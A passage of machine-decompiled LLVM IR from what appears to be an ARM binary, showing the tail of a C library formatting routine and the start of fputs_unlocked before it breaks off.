  %v1_15410 = phi i32 [ %v1_15484, %dec_label_pc_15484 ], [ ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32), %dec_label_pc_153f8 ]
  %v1_15400 = inttoptr i32 %v1_15410 to i8*
  %v2_15400 = load i8, i8* %v1_15400, align 1
  %v3_15400 = zext i8 %v2_15400 to i32
  store i32 %v3_15400, i32* %r3.global-to-local, align 4
  %v9_15404 = icmp eq i8 %v2_15400, %v2_153e4
  br i1 %v9_15404, label %dec_label_pc_1540c, label %dec_label_pc_15484

dec_label_pc_1540c:                               ; preds = %dec_label_pc_15400
  store i32 ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32), i32* %r3.global-to-local, align 4
  %v2_15410 = sub i32 %v1_15410, ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32)
  store i32 %v2_15410, i32* %r2.global-to-local, align 4
  %v7_15418 = icmp slt i32 %v2_15410, 18
  br i1 %v7_15418, label %bb137, label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %dec_label_pc_1540c
  %v1_1541c = and i32 %v3_153f0, 1024
  %v2_1541c = icmp eq i32 %v1_1541c, 0
  br i1 %v2_1541c, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_1541c
  %v2_15420 = add i32 %v2_15410, -2
  store i32 %v2_15420, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_1540c, %dec_label_pc_1541c, %bb136
  %v0_15424 = phi i32 [ %v2_15410, %dec_label_pc_1540c ], [ %v2_15410, %dec_label_pc_1541c ], [ %v2_15420, %bb136 ]
  %v1_15424 = load i32, i32* %r7.global-to-local, align 4
  %v2_15424 = add i32 %v1_15424, 32
  %v3_15424 = inttoptr i32 %v2_15424 to i32*
  store i32 %v0_15424, i32* %v3_15424, align 4
  store i32 ptrtoint (i32* @global_var_21fdb.1363 to i32), i32* %r1.global-to-local, align 4
  %v0_15430.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1542c

dec_label_pc_1542c:                               ; preds = %dec_label_pc_1542c, %bb137
  %v0_1542c = phi i32 [ %v1_1542c, %dec_label_pc_1542c ], [ ptrtoint (i32* @global_var_21fdb.1363 to i32), %bb137 ]
  %v1_1542c = add i32 %v0_1542c, 1
  %v2_1542c = inttoptr i32 %v1_1542c to i8*
  %v3_1542c = load i8, i8* %v2_1542c, align 1
  %v4_1542c = zext i8 %v3_1542c to i32
  store i32 %v4_1542c, i32* %r3.global-to-local, align 4
  store i32 %v1_1542c, i32* %r1.global-to-local, align 4
  %v8_15434 = icmp sgt i32 %v0_15430.pre, %v4_1542c
  br i1 %v8_15434, label %dec_label_pc_1542c, label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_1542c
  store i32 ptrtoint (i32* @global_var_21fcc.1367 to i32), i32* %r0.global-to-local, align 4
  %v2_15440 = sub i32 %v1_1542c, ptrtoint (i32* @global_var_21fdc.1365 to i32)
  %v2_15444 = mul i32 %v2_15440, 2
  store i32 %v2_15444, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21fbc.1369 to i32), i32* %ip.global-to-local, align 4
  %v2_1544c = add i32 %v2_15444, ptrtoint (i32* @global_var_21fcc.1367 to i32)
  store i32 %v2_1544c, i32* %r2.global-to-local, align 4
  %v1_15450 = add i32 %v2_15444, add (i32 ptrtoint (i32* @global_var_21fcc.1367 to i32), i32 1)
  %v2_15450 = inttoptr i32 %v1_15450 to i8*
  %v3_15450 = load i8, i8* %v2_15450, align 1
  %v4_15450 = zext i8 %v3_15450 to i32
  store i32 %v4_15450, i32* %r1.global-to-local, align 4
  %v2_15454 = add i32 %v2_15444, ptrtoint (i32* @global_var_21fbc.1369 to i32)
  store i32 %v2_15454, i32* %r2.global-to-local, align 4
  %v3_15458 = inttoptr i32 %v2_1544c to i8*
  %v4_15458 = load i8, i8* %v3_15458, align 2
  %v6_15458 = zext i8 %v4_15458 to i32
  store i32 %v6_15458, i32* %r0.global-to-local, align 4
  %v1_1545c = add i32 %v2_15444, add (i32 ptrtoint (i32* @global_var_21fbc.1369 to i32), i32 1)
  %v2_1545c = inttoptr i32 %v1_1545c to i8*
  %v3_1545c = load i8, i8* %v2_1545c, align 1
  %v4_1545c = zext i8 %v3_1545c to i32
  store i32 %v4_1545c, i32* %r2.global-to-local, align 4
  %v3_15460 = inttoptr i32 %v2_15454 to i8*
  %v4_15460 = load i8, i8* %v3_15460, align 2
  %v6_15460 = zext i8 %v4_15460 to i32
  %v3_15464 = mul nuw i32 %v4_15450, 16777216
  store i32 %v3_15464, i32* %r1.global-to-local, align 4
  %v4_15468 = sdiv i32 %v3_15464, 65536
  %v5_15468 = or i32 %v6_15458, %v4_15468
  %v3_1546c = mul nuw i32 %v4_1545c, 16777216
  store i32 %v3_1546c, i32* %r2.global-to-local, align 4
  %v4_15470 = sdiv i32 %v3_1546c, 65536
  %v5_15470 = or i32 %v6_15460, %v4_15470
  store i32 %v5_15470, i32* %r3.global-to-local, align 4
  %v0_15474 = load i32, i32* @lr, align 4
  %v2_15474 = or i32 %v5_15468, %v0_15474
  store i32 ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32), i32* %ip.global-to-local, align 4
  %v2_1547c = and i32 %v2_15474, %v5_15470
  store i32 %v2_1547c, i32* %r0.global-to-local, align 4
  %v0_15498.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15490

dec_label_pc_15484:                               ; preds = %dec_label_pc_15400
  %v1_15484 = add i32 %v1_15410, 1
  %v2_15484 = inttoptr i32 %v1_15484 to i8*
  %v3_15484 = load i8, i8* %v2_15484, align 1
  %v4_15484 = zext i8 %v3_15484 to i32
  store i32 %v4_15484, i32* %r3.global-to-local, align 4
  store i32 %v1_15484, i32* %ip.global-to-local, align 4
  %v2_15488 = icmp eq i8 %v3_15484, 0
  br i1 %v2_15488, label %dec_label_pc_15490, label %dec_label_pc_15400

dec_label_pc_15490:                               ; preds = %dec_label_pc_15484, %dec_label_pc_15438
  %v0_1549c = phi i32 [ %v0_15474, %dec_label_pc_15438 ], [ %v3_153f0, %dec_label_pc_15484 ]
  %v0_15498 = phi i32 [ %v0_15498.pre, %dec_label_pc_15438 ], [ %v0_153e4, %dec_label_pc_15484 ]
  %v0_15490 = phi i32 [ %v2_1547c, %dec_label_pc_15438 ], [ %v3_153fc, %dec_label_pc_15484 ]
  store i32 %v0_15490, i32* %stack_var_-36, align 4
  %v0_15494 = load i32, i32* @r4, align 4
  %v1_15494 = and i32 %v0_15494, 4
  %v1_15498 = inttoptr i32 %v0_15498 to i8*
  %v2_15498 = load i8, i8* %v1_15498, align 1
  %v3_15498 = zext i8 %v2_15498 to i32
  store i32 %v3_15498, i32* %r1.global-to-local, align 4
  %v1_1549c = and i32 %v0_1549c, 3840
  %v1_154a0 = and i32 %v0_15494, -5
  %v2_154a4 = or i32 %v1_154a0, %v1_1549c
  store i32 %v2_154a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_15494, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_154b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154b4 = add i32 %v1_154b4, 12
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  store i32 %v3_15498, i32* %v3_154b4, align 4
  %v0_154b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_154b8 = add i32 %v0_154b8, 4
  %v2_154b8 = inttoptr i32 %v1_154b8 to i32*
  %v3_154b8 = load i32, i32* @r5, align 4
  store i32 %v3_154b8, i32* %v2_154b8, align 4
  %v4_154b8 = add i32 %v0_154b8, 8
  %v5_154b8 = inttoptr i32 %v4_154b8 to i32*
  %v6_154b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_154b8, i32* %v5_154b8, align 4
  %v0_154bc = load i32, i32* %r3.global-to-local, align 4
  %v1_154bc = load i32, i32* %r7.global-to-local, align 4
  %v2_154bc = add i32 %v1_154bc, 20
  %v3_154bc = inttoptr i32 %v2_154bc to i32*
  store i32 %v0_154bc, i32* %v3_154bc, align 4
  %v0_154c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_154c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_154c0 = add i32 %v1_154c0, 16
  %v3_154c0 = inttoptr i32 %v2_154c0 to i32*
  store i32 %v0_154c0, i32* %v3_154c0, align 4
  %v0_154c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_154c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154c4 = add i32 %v1_154c4, 28
  %v3_154c4 = inttoptr i32 %v2_154c4 to i32*
  store i32 %v0_154c4, i32* %v3_154c4, align 4
  %v0_154c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_154c8 = inttoptr i32 %v0_154c8 to i8*
  %v2_154c8 = load i8, i8* %v1_154c8, align 1
  %v3_154c8 = zext i8 %v2_154c8 to i32
  store i32 %v3_154c8, i32* %r2.global-to-local, align 4
  %v2_154cc = icmp eq i8 %v2_154c8, 0
  br i1 %v2_154cc, label %dec_label_pc_154d4, label %dec_label_pc_154ec

dec_label_pc_154d4:                               ; preds = %dec_label_pc_15490
  %v0_154d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_154d4 = inttoptr i32 %v0_154d4 to i8*
  %v2_154d4 = load i8, i8* %v1_154d4, align 1
  %v3_154d4 = zext i8 %v2_154d4 to i32
  store i32 %v3_154d4, i32* %r3.global-to-local, align 4
  %v7_154d8 = icmp eq i8 %v2_154d4, 109
  br i1 %v7_154d8, label %dec_label_pc_154e0, label %dec_label_pc_155f0

dec_label_pc_154e0:                               ; preds = %dec_label_pc_154d4
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_154e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154e4 = add i32 %v1_154e4, 32
  %v3_154e4 = inttoptr i32 %v2_154e4 to i32*
  store i32 20, i32* %v3_154e4, align 4
  %v0_154e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_154e8 = add i32 %v1_154e8, 28
  %v3_154e8 = inttoptr i32 %v2_154e8 to i32*
  store i32 %v0_154e8, i32* %v3_154e8, align 4
  br label %dec_label_pc_154ec

dec_label_pc_154ec:                               ; preds = %dec_label_pc_15490, %dec_label_pc_154e0
  %v0_154ec = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_154ec, 1
  br i1 %tmp141, label %dec_label_pc_155a4, label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154ec
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %dec_label_pc_1558c, %dec_label_pc_154f4
  %v8_15514 = phi i32 [ 0, %dec_label_pc_154f4 ], [ %v1_15590, %dec_label_pc_1558c ]
  %v7_154fc = icmp sgt i32 %v8_15514, 2
  br i1 %v7_154fc, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_154f8
  store i32 %v25_1515c, i32* %r2.global-to-local, align 4
  %v12_15500 = mul i32 %v8_15514, 4
  %v13_15500 = add i32 %v12_15500, %v25_1515c
  store i32 %v13_15500, i32* %r3.global-to-local, align 4
  %v9_15504 = add i32 %v13_15500, -24
  %v10_15504 = inttoptr i32 %v9_15504 to i32*
  %v11_15504 = load i32, i32* %v10_15504, align 4
  store i32 %v11_15504, i32* %r2.global-to-local, align 4
  %v9_15508 = load i32, i32* %r7.global-to-local, align 4
  %v10_15508 = add i32 %v9_15508, %v8_15514
  store i32 %v10_15508, i32* %r3.global-to-local, align 4
  %v9_15510 = trunc i32 %v11_15504 to i8
  %v11_15510 = add i32 %v10_15508, 36
  %v12_15510 = inttoptr i32 %v11_15510 to i8*
  store i8 %v9_15510, i8* %v12_15510, align 1
  %v8_15518 = load i32, i32* %r3.global-to-local, align 4
  %v9_15518 = add i32 %v8_15518, 36
  %v10_15518 = inttoptr i32 %v9_15518 to i8*
  %v11_15518 = load i8, i8* %v10_15518, align 1
  %v12_15518 = zext i8 %v11_15518 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_154f8
  %v10_15514 = add i32 %v8_15514, %stack_var_-48.3
  store i32 %v10_15514, i32* %r3.global-to-local, align 4
  %v9_1551c = add i32 %v10_15514, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_15540 = phi i32 [ %v12_15518, %bb142 ], [ %v9_1551c, %bb143 ]
  store i32 %v0_15540, i32* @r2, align 4
  %v1_15520 = load i32, i32* %sb.global-to-local, align 4
  %v2_15520 = sub i32 %v0_15540, %v1_15520
  %v4_15520 = xor i32 %v1_15520, %v0_15540
  %v5_15520 = xor i32 %v2_15520, %v0_15540
  %v6_15520 = and i32 %v5_15520, %v4_15520
  %v7_15520 = icmp slt i32 %v6_15520, 0
  %v8_15520 = icmp slt i32 %v2_15520, 0
  %v9_15520 = icmp eq i32 %v0_15540, %v1_15520
  %v3_15524 = xor i1 %v8_15520, %v7_15520
  %v4_15524 = or i1 %v9_15520, %v3_15524
  br i1 %v4_15524, label %dec_label_pc_15534, label %dec_label_pc_15528

dec_label_pc_15528:                               ; preds = %bb144
  %v1_15528 = add i32 %v0_15540, -9
  %v3_15528 = sub i32 8, %v0_15540
  %v4_15528 = and i32 %v3_15528, %v0_15540
  %v5_15528 = icmp slt i32 %v4_15528, 0
  %v6_15528 = icmp slt i32 %v1_15528, 0
  %v7_15528 = icmp eq i32 %v0_15540, 9
  %v3_1552c = xor i1 %v6_15528, %v5_15528
  %v4_1552c = or i1 %v7_15528, %v3_1552c
  br i1 %v4_1552c, label %dec_label_pc_15530, label %dec_label_pc_155f0

dec_label_pc_15530:                               ; preds = %dec_label_pc_15528
  store i32 %v0_15540, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %bb144, %dec_label_pc_15530
  store i32 %v25_1515c, i32* %ip.global-to-local, align 4
  %v1_15538 = load i32, i32* %r8.global-to-local, align 4
  %v4_15538 = mul i32 %v1_15538, 4
  %v5_15538 = add i32 %v4_15538, %v25_1515c
  store i32 %v5_15538, i32* %r3.global-to-local, align 4
  %v1_1553c = add i32 %v5_15538, -12
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* %r5.global-to-local, align 4
  %v1_15540 = add i32 %v0_15540, -1
  store i32 %v1_15540, i32* %sl.global-to-local, align 4
  %v0_15544 = load i32, i32* %r7.global-to-local, align 4
  %v4_15544 = mul i32 %v1_15540, 4
  %v5_15544 = add i32 %v0_15544, %v4_15544
  store i32 %v5_15544, i32* %r3.global-to-local, align 4
  %v7_15548 = icmp eq i32 %v3_1553c, 8
  %v1_1554c = add i32 %v5_15544, 40
  %v2_1554c = inttoptr i32 %v1_1554c to i32*
  %v3_1554c = load i32, i32* %v2_1554c, align 4
  store i32 %v3_1554c, i32* @r0, align 4
  br i1 %v7_15548, label %dec_label_pc_1558c, label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_15534
  %v9_15554 = icmp eq i32 %v3_1554c, %v3_1553c
  br i1 %v9_15554, label %dec_label_pc_15578, label %bb145

bb145:                                            ; preds = %dec_label_pc_15554
  %v8_15558 = icmp eq i32 %v3_1554c, 8
  br i1 %v8_15558, label %dec_label_pc_15578, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %bb145
  %v0_15560 = call i32 @_promoted_size()
  %v0_15568 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15568, i32* @r0, align 4
  %v0_1556c = call i32 @_promoted_size()
  store i32 %v0_1556c, i32* %r0.global-to-local, align 4
  %v8_15574 = icmp sgt i32 %v0_15560, %v0_1556c
  br i1 %v8_15574, label %dec_label_pc_1558c, label %dec_label_pc_15560.dec_label_pc_15578_crit_edge

dec_label_pc_15560.dec_label_pc_15578_crit_edge:  ; preds = %dec_label_pc_15560
  %v1_1557c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15584.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_15584.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15578

dec_label_pc_15578:                               ; preds = %dec_label_pc_15560.dec_label_pc_15578_crit_edge, %dec_label_pc_15554, %bb145
  %v1_15584 = phi i32 [ %v1_15584.pre, %dec_label_pc_15560.dec_label_pc_15578_crit_edge ], [ %v1_15540, %dec_label_pc_15554 ], [ %v1_15540, %bb145 ]
  %v0_15584 = phi i32 [ %v0_15584.pre, %dec_label_pc_15560.dec_label_pc_15578_crit_edge ], [ %v0_15544, %dec_label_pc_15554 ], [ %v0_15544, %bb145 ]
  %v1_1557c = phi i32 [ %v1_1557c.pre, %dec_label_pc_15560.dec_label_pc_15578_crit_edge ], [ %v1_15538, %dec_label_pc_15554 ], [ %v1_15538, %bb145 ]
  store i32 %v25_1515c, i32* %r1.global-to-local, align 4
  %v4_1557c = mul i32 %v1_1557c, 4
  %v5_1557c = add i32 %v4_1557c, %v25_1515c
  store i32 %v5_1557c, i32* %r3.global-to-local, align 4
  %v1_15580 = add i32 %v5_1557c, -12
  %v2_15580 = inttoptr i32 %v1_15580 to i32*
  %v3_15580 = load i32, i32* %v2_15580, align 4
  store i32 %v3_15580, i32* @r2, align 4
  %v4_15584 = mul i32 %v1_15584, 4
  %v5_15584 = add i32 %v4_15584, %v0_15584
  store i32 %v5_15584, i32* %r3.global-to-local, align 4
  %v2_15588 = add i32 %v5_15584, 40
  %v3_15588 = inttoptr i32 %v2_15588 to i32*
  store i32 %v3_15580, i32* %v3_15588, align 4
  br label %dec_label_pc_1558c

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15560, %dec_label_pc_15534, %dec_label_pc_15578
  %v0_1558c = load i32, i32* %r7.global-to-local, align 4
  %v1_1558c = add i32 %v0_1558c, 28
  %v2_1558c = inttoptr i32 %v1_1558c to i32*
  %v3_1558c = load i32, i32* %v2_1558c, align 4
  %v0_15590 = load i32, i32* %r8.global-to-local, align 4
  %v1_15590 = add i32 %v0_15590, 1
  store i32 %v1_15590, i32* %r8.global-to-local, align 4
  %v1_15594 = add i32 %v3_1558c, 2
  store i32 %v1_15594, i32* %r3.global-to-local, align 4
  %v6_1559c = icmp slt i32 %v1_15590, %v1_15594
  br i1 %v6_1559c, label %dec_label_pc_154f8, label %dec_label_pc_155bc

dec_label_pc_155a4:                               ; preds = %dec_label_pc_154ec
  %v0_155a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_155a4 = add i32 %v0_155a4, 28
  %v2_155a4 = inttoptr i32 %v1_155a4 to i32*
  %v3_155a4 = load i32, i32* %v2_155a4, align 4
  store i32 %v3_155a4, i32* %r2.global-to-local, align 4
  %v0_155a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_155a8 = trunc i32 %v0_155a8 to i8
  %v3_155a8 = add i32 %v0_155a4, 38
  %v4_155a8 = inttoptr i32 %v3_155a8 to i8*
  store i8 %v1_155a8, i8* %v4_155a8, align 1
  %v0_155ac = load i32, i32* %r2.global-to-local, align 4
  %v3_155ac = mul i32 %v0_155ac, 4
  store i32 %v3_155ac, i32* @r2, align 4
  %v0_155b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_155b0 = add i32 %v0_155b0, 40
  store i32 %v1_155b0, i32* @r0, align 4
  %v2_155b4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_155b4, i32* @r1, align 4
  %v0_155b8 = call i32 @memcpy()
  store i32 %v0_155b8, i32* %r0.global-to-local, align 4
  %v0_155bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %dec_label_pc_1558c, %dec_label_pc_155a4
  %v2_155d8 = phi i32 [ %v0_155bc.pre, %dec_label_pc_155a4 ], [ %v0_1558c, %dec_label_pc_1558c ]
  %v1_155bc = add i32 %v2_155d8, 16
  %v2_155bc = inttoptr i32 %v1_155bc to i32*
  %v3_155bc = load i32, i32* %v2_155bc, align 4
  store i32 %v3_155bc, i32* %r3.global-to-local, align 4
  %v1_155c0 = and i32 %v3_155bc, 128
  %v2_155c0 = icmp eq i32 %v1_155c0, 0
  br i1 %v2_155c0, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_155bc
  store i32 %v2_15164, i32* %r3.global-to-local, align 4
  %v2_155c8 = inttoptr i32 %v2_155d8 to i32*
  %v3_155c8 = load i32, i32* %v2_155c8, align 4
  %v2_155d0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_155d0 = sub i32 %v2_155d0.pre, %v2_15164
  store i32 %v3_155d0, i32* %r3.global-to-local, align 4
  %v5_155d4 = mul i32 %v3_155d0, 4
  %v6_155d4 = add i32 %v5_155d4, %v3_155c8
  store i32 %v6_155d4, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_155bc
  %v1_155cc41 = load i32, i32* %r6.global-to-local, align 4
  %v2_155cc42 = add i32 %v1_155cc41, 1
  store i32 %v2_155cc42, i32* %r3.global-to-local, align 4
  %v3_155d8 = inttoptr i32 %v2_155d8 to i32*
  store i32 %v2_155cc42, i32* %v3_155d8, align 4
  %v0_155dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_155e4 = phi i32 [ %v2_155d8, %.thread44 ], [ %v0_155dc.pre, %.thread46 ]
  %v1_155dc = add i32 %v1_155e4, 28
  %v2_155dc = inttoptr i32 %v1_155dc to i32*
  %v3_155dc = load i32, i32* %v2_155dc, align 4
  store i32 %v3_155dc, i32* %r3.global-to-local, align 4
  %v1_155e0 = add i32 %v3_155dc, 2
  store i32 %v1_155e0, i32* %r0.global-to-local, align 4
  %v0_155e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_155e4 = add i32 %v1_155e4, 24
  %v3_155e4 = inttoptr i32 %v2_155e4 to i32*
  store i32 %v0_155e4, i32* %v3_155e4, align 4
  br i1 %v2_155c0, label %dec_label_pc_155f4, label %bb147

bb147:                                            ; preds = %bb146
  %v1_155e8 = load i32, i32* @r2, align 4
  %v2_155e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_155e8 = inttoptr i32 %v2_155e8 to i32*
  store i32 %v1_155e8, i32* %v3_155e8, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155f0:                               ; preds = %dec_label_pc_151ac, %dec_label_pc_152b8, %dec_label_pc_15368, %dec_label_pc_1533c, %dec_label_pc_15348, %dec_label_pc_15288, %dec_label_pc_15528, %dec_label_pc_154d4, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %bb147, %bb146, %dec_label_pc_155f0
  %v2_155f8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_155f8, i32* @r4, align 4
  store i32 %v6_1515c, i32* @r5, align 4
  %v26_155f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_155f8

; uselistorder directives
  uselistorder i32 %v3_155d0, { 1, 0 }
  uselistorder i32 %v1_15590, { 1, 2, 0 }
  uselistorder i32 %v0_15544, { 1, 2, 0 }
  uselistorder i32 %v2_15520, { 1, 0 }
  uselistorder i32 %v1_15520, { 1, 0, 2 }
  uselistorder i32 %v0_15540, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_15484, { 1, 2, 0 }
  uselistorder i32 %v3_1546c, { 1, 0 }
  uselistorder i32 %v3_15464, { 1, 0 }
  uselistorder i32 %v2_15444, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1542c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15410, { 1, 0, 2 }
  uselistorder i32 %v3_153f0, { 2, 1, 0 }
  uselistorder i32 %v1_153b4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_15388, { 1, 0 }
  uselistorder i32 %v5_152e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_152e8, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_15294, { 1, 0 }
  uselistorder i32 %v0_152b0, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_15278, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_15260, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_1524c, { 1, 2, 0 }
  uselistorder i32 %v0_152c4, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_15200, { 1, 0 }
  uselistorder i32 %v1_151d0, { 0, 2, 1 }
  uselistorder i32 %v25_1515c, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 5, 9, 6, 0, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 10, 12, 11, 0, 2, 13, 3, 4, 5, 7, 8, 15, 6, 1, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_21fbc.1369 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_21fcc.1367 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_21fa8.1359 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_155f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_155f0, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_155bc, { 1, 0 }
  uselistorder label %dec_label_pc_1558c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15578, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15534, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_154ec, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153a0, { 1, 0 }
  uselistorder label %dec_label_pc_15378, { 1, 0 }
  uselistorder label %dec_label_pc_15328, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_152a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152a4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15204, { 1, 0 }
  uselistorder label %dec_label_pc_151f4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15620 = load i32, i32* @r4, align 4
  store i32 %v3_15620, i32* %stack_var_-16, align 4
  %v6_15620 = load i32, i32* @r5, align 4
  %v9_15620 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1562c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1562c, i32* @r6, align 4
  %v0_15634 = load i32, i32* @r5, align 4
  %v0_15638 = load i32, i32* @r4, align 4
  %v5_15644 = inttoptr i32 %v0_15634 to i8*
  %v6_15644 = call i32 @__GI_fwrite_unlocked(i32 %v0_15638, i32 1, i32 %v3_1562c, i8* %v5_15644)
  %v1_15648 = load i32, i32* @r6, align 4
  %v9_15648 = icmp eq i32 %v6_15644, %v1_15648
  br i1 %v9_15648, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
